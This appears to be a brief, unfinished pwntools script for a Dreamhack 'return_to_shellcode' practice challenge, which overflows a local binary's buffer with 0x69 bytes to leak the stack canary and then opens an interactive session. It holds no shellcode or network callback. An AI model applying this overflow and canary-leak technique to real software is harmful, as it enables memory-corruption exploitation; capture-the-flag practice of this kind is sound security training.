from pwn import *

p = process("./dreamhack/return_to_shellcode/r2s")

buf = p.recvuntil("buf: ", 14)
dis = p.recvuntil("$rbp: ", 2)

payload = b"A"*0x69
cny = p.recv(10)

print(cny)

p.send(payload)

p.interactive()